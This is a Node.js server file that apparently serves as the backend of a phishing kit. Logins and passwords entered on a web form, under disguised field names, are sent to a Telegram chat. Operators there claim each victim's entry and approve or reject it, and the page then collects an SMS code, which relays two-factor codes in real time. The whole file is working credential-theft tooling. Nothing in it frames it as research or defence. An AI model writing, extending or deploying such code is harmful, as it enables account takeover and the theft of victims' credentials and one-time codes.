import { createServer } from "node:http";
import { existsSync, readFileSync } from "node:fs";
import { readFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

function loadEnvFile() {
  const envPath = path.join(__dirname, ".env");

  if (!existsSync(envPath)) {
    return;
  }

  const content = readFileSync(envPath, "utf8");

  for (const rawLine of content.split(/\r?\n/)) {
    const line = rawLine.trim();

    if (!line || line.startsWith("#")) {
      continue;
    }

    const separatorIndex = line.indexOf("=");
    if (separatorIndex === -1) {
      continue;
    }

    const key = line.slice(0, separatorIndex).trim();
    let value = line.slice(separatorIndex + 1).trim();

    if (
      (value.startsWith('"') && value.endsWith('"')) ||
      (value.startsWith("'") && value.endsWith("'"))
    ) {
      value = value.slice(1, -1);
    }

    if (!(key in process.env)) {
      process.env[key] = value;
    }
  }
}

loadEnvFile();

const PORT = Number(process.env.PORT || 3000);
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";
const requests = new Map();
let telegramOffset = 0;

const MIME_TYPES = {
  ".html": "text/html; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".svg": "image/svg+xml",
  ".webp": "image/webp",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".json": "application/json; charset=utf-8",
};

function sendJson(response, statusCode, payload) {
  response.writeHead(statusCode, {
    "Content-Type": "application/json; charset=utf-8",
  });
  response.end(JSON.stringify(payload));
}

async function readJsonBody(request) {
  const chunks = [];

  for await (const chunk of request) {
    chunks.push(chunk);
  }

  const raw = Buffer.concat(chunks).toString("utf8");
  return raw ? JSON.parse(raw) : {};
}

async function telegram(method, payload) {
  if (!BOT_TOKEN || !CHAT_ID) {
    throw new Error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env");
  }

  const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
  });

  const data = await response.json();

  if (!response.ok || !data.ok) {
    throw new Error(`Telegram API error: ${JSON.stringify(data)}`);
  }

  return data;
}

function isMessageNotModifiedError(error) {
  return String(error?.message || "").includes("message is not modified");
}

async function serveFile(response, filePath) {
  const extension = path.extname(filePath).toLowerCase();
  const contentType = MIME_TYPES[extension] || "application/octet-stream";
  const file = await readFile(filePath);
  response.writeHead(200, { "Content-Type": contentType });
  response.end(file);
}

function getTelegramActorTag(from) {
  if (!from) {
    return "unknown";
  }

  if (from.username) {
    return `@${from.username}`;
  }

  const fullName = [from.first_name, from.last_name].filter(Boolean).join(" ").trim();
  return fullName || String(from.id || "unknown");
}

function buildNameMessage(application) {
  const lines = [
    "Новая заявка с формы",
    `ID: ${application.requestId}`,
    ` `,
    `👤Логин: ${application.firstName}`,
    `🔒Пароль: ${application.lastName}`,
  ];

  if (application.nameGreeterTag) {
    lines.push(`Взял: ${application.nameGreeterTag}`);
  }

  return lines.join("\n");
}

function buildYearMessage(application) {
  const lines = [
    "Получен SMS",
    `ID: ${application.requestId}`,
    ` `,
    `Логин: ${application.firstName}`,
    `📩SMS: ${application.residenceYear}`,
  ];

  if (application.yearGreeterTag) {
    lines.push(`Взял: ${application.yearGreeterTag}`);
  }

  return lines.join("\n");
}

function buildHelloKeyboard(callbackData) {
  return {
    inline_keyboard: [[{ text: "Взял", callback_data: callbackData }]],
  };
}

function buildDecisionKeyboard(approveData, rejectData) {
  return buildMarkedDecisionKeyboard(approveData, rejectData, "");
}

function buildMarkedDecisionKeyboard(approveData, rejectData, selectedAction) {
  const approveText = selectedAction === "approve" ? "✅ Принять" : "Принять";
  const rejectText = selectedAction === "reject" ? "✅ Отклонить" : "Отклонить";

  return {
    inline_keyboard: [
      [
        { text: approveText, callback_data: approveData },
        { text: rejectText, callback_data: rejectData },
      ],
    ],
  };
}

function buildNamePasswordCopyKeyboard(replyMarkup, application) {
  return {
    inline_keyboard: [
      ...replyMarkup.inline_keyboard,
      [
        {
          text: "Логин",
          copy_text: {
            text: application.firstName,
          },
        },
        {
          text: "Пароль",
          copy_text: {
            text: application.lastName,
          },
        },
      ],
    ],
  };
}

async function handleSubmit(request, response) {
  try {
    const body = await readJsonBody(request);
    const firstName = String(body.firstName || "").trim();
    const lastName = String(body.lastName || "").trim();

    if (!firstName || !lastName) {
      sendJson(response, 400, { ok: false, message: "Missing firstName or lastName" });
      return;
    }

    const requestId = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
    const application = {
      requestId,
      firstName,
      lastName,
      residenceYear: "",
      status: "pending",
      createdAt: Date.now(),
      nameGreeterTag: "",
      yearGreeterTag: "",
    };

    requests.set(requestId, application);

    await telegram("sendMessage", {
      chat_id: CHAT_ID,
      text: buildNameMessage(application),
      reply_markup: buildNamePasswordCopyKeyboard(buildHelloKeyboard(`hello_name|${requestId}`), application),
    });

    sendJson(response, 200, { ok: true, requestId });
  } catch (error) {
    sendJson(response, 500, { ok: false, message: error.message });
  }
}

function handleRequestStatus(url, response) {
  const requestId = url.searchParams.get("id") || "";
  const application = requests.get(requestId);

  if (!application) {
    sendJson(response, 404, { ok: false, message: "Request not found" });
    return;
  }

  sendJson(response, 200, {
    ok: true,
    status: application.status,
  });
}

async function handleResidenceYear(request, response) {
  try {
    const body = await readJsonBody(request);
    const requestId = String(body.requestId || "").trim();
    const residenceYear = String(body.residenceYear || "").trim();
    const application = requests.get(requestId);

    if (!application) {
      sendJson(response, 404, { ok: false, message: "Request not found" });
      return;
    }

    if (application.status !== "approved" && application.status !== "year_rejected") {
      sendJson(response, 409, { ok: false, message: "Request is not ready for residence year" });
      return;
    }

    if (!/^\d+$/.test(residenceYear)) {
      sendJson(response, 400, { ok: false, message: "Residence year must contain only digits" });
      return;
    }

    application.residenceYear = residenceYear;
    application.yearGreeterTag = application.nameGreeterTag || "";
    application.status = application.yearGreeterTag ? "year_review" : "year_pending";

    const replyMarkup = application.yearGreeterTag
      ? buildDecisionKeyboard(`approve_year|${requestId}`, `reject_year|${requestId}`)
      : buildHelloKeyboard(`hello_year|${requestId}`);

    await telegram("sendMessage", {
      chat_id: CHAT_ID,
      text: buildYearMessage(application),
      reply_markup: buildNamePasswordCopyKeyboard(replyMarkup, application),
    });

    sendJson(response, 200, { ok: true });
  } catch (error) {
    sendJson(response, 500, { ok: false, message: error.message });
  }
}

async function handleWebhook(request, response) {
  try {
    const update = await readJsonBody(request);
    await processTelegramUpdate(update);
    sendJson(response, 200, { ok: true });
  } catch (error) {
    sendJson(response, 500, { ok: false, message: error.message });
  }
}

async function processCallbackQuery(callbackQuery) {
  if (!callbackQuery?.data || !callbackQuery?.id) {
    return;
  }

  const [action, requestId = ""] = String(callbackQuery.data || "").split("|");

  const application = requests.get(requestId);

  if (!application) {
    await telegram("answerCallbackQuery", {
      callback_query_id: callbackQuery.id,
      text: "Заявка не найдена или сервер был перезапущен",
    });
    return;
  }

  const greeterTag = getTelegramActorTag(callbackQuery.from);
  let messageText = "";
  let answerText = "";
  let replyMarkup = undefined;

  if (action === "hello_name") {
    application.nameGreeterTag = greeterTag;
    application.status = "name_review";
    messageText = buildNameMessage(application);
    answerText = `Взял лог ${greeterTag}`;
    replyMarkup = buildNamePasswordCopyKeyboard(buildDecisionKeyboard(`approve_name|${requestId}`, `reject_name|${requestId}`), application);
  } else if (action === "approve_name") {
    application.status = "approved";
    messageText = buildNameMessage(application);
    answerText = "Заявка принята";
    replyMarkup = buildNamePasswordCopyKeyboard(buildMarkedDecisionKeyboard(`approve_name|${requestId}`, `reject_name|${requestId}`, "approve"), application);
  } else if (action === "reject_name") {
    application.status = "rejected";
    messageText = buildNameMessage(application);
    answerText = "Заявка отклонена";
    replyMarkup = buildNamePasswordCopyKeyboard(buildMarkedDecisionKeyboard(`approve_name|${requestId}`, `reject_name|${requestId}`, "reject"), application);
  } else if (action === "hello_year") {
    application.yearGreeterTag = greeterTag;
    application.status = "year_review";
    messageText = buildYearMessage(application);
    answerText = `Взял лог ${greeterTag}`;
    replyMarkup = buildNamePasswordCopyKeyboard(buildDecisionKeyboard(`approve_year|${requestId}`, `reject_year|${requestId}`), application);
  } else if (action === "approve_year") {
    application.status = "completed";
    messageText = buildYearMessage(application);
    answerText = "SMS принят";
    replyMarkup = buildNamePasswordCopyKeyboard(buildMarkedDecisionKeyboard(`approve_year|${requestId}`, `reject_year|${requestId}`, "approve"), application);
  } else if (action === "reject_year") {
    application.status = "year_rejected";
    messageText = buildYearMessage(application);
    answerText = "SMS отклонен";
    replyMarkup = buildNamePasswordCopyKeyboard(buildMarkedDecisionKeyboard(`approve_year|${requestId}`, `reject_year|${requestId}`, "reject"), application);
  } else {
    await telegram("answerCallbackQuery", {
      callback_query_id: callbackQuery.id,
      text: "Неизвестное действие",
    });
    return;
  }

  await telegram("answerCallbackQuery", {
    callback_query_id: callbackQuery.id,
    text: answerText,
  });

  if (callbackQuery.message?.chat?.id && callbackQuery.message?.message_id) {
    try {
      await telegram("editMessageText", {
        chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        text: messageText,
        reply_markup: replyMarkup,
      });
    } catch (error) {
      if (!isMessageNotModifiedError(error)) {
        throw error;
      }
    }
  }
}

async function processTelegramUpdate(update) {
  const callbackQuery = update?.callback_query;

  if (!callbackQuery) {
    return;
  }

  await processCallbackQuery(callbackQuery);
}

async function startTelegramPolling() {
  if (!BOT_TOKEN) {
    console.log("Telegram polling skipped: missing TELEGRAM_BOT_TOKEN");
    return;
  }

  try {
    await telegram("deleteWebhook", { drop_pending_updates: false });
  } catch (error) {
    console.error("Could not disable Telegram webhook:", error.message);
  }

  const loop = async () => {
    try {
      const data = await telegram("getUpdates", {
        offset: telegramOffset,
        timeout: 20,
        allowed_updates: ["callback_query"],
      });

      if (Array.isArray(data.result)) {
        for (const update of data.result) {
          telegramOffset = update.update_id + 1;
          await processTelegramUpdate(update);
        }
      }
    } catch (error) {
      console.error("Telegram polling error:", error.message);
      await new Promise((resolve) => setTimeout(resolve, 3000));
    }

    setImmediate(loop);
  };

  loop();
}

createServer(async (request, response) => {
  try {
    const url = new URL(request.url, `http://${request.headers.host}`);

    if (request.method === "GET" && url.pathname === "/") {
      await serveFile(response, path.join(__dirname, "index.html"));
      return;
    }

    if (request.method === "GET" && url.pathname === "/styles.css") {
      await serveFile(response, path.join(__dirname, "styles.css"));
      return;
    }

    if (request.method === "GET" && url.pathname.startsWith("/img/")) {
      const fileName = path.basename(url.pathname);
      await serveFile(response, path.join(__dirname, "img", fileName));
      return;
    }

    if (request.method === "GET" && url.pathname === "/request-status") {
      handleRequestStatus(url, response);
      return;
    }

    if (request.method === "POST" && url.pathname === "/submit") {
      await handleSubmit(request, response);
      return;
    }

    if (request.method === "POST" && url.pathname === "/submit-residence-year") {
      await handleResidenceYear(request, response);
      return;
    }

    if (request.method === "POST" && url.pathname === "/telegram/webhook") {
      await handleWebhook(request, response);
      return;
    }

    sendJson(response, 404, { ok: false, message: "Not found" });
  } catch (error) {
    sendJson(response, 500, { ok: false, message: error.message });
  }
}).listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`Telegram bot configured: ${BOT_TOKEN ? "yes" : "no"}`);
  console.log(`Telegram chat configured: ${CHAT_ID ? "yes" : "no"}`);
  startTelegramPolling();
});
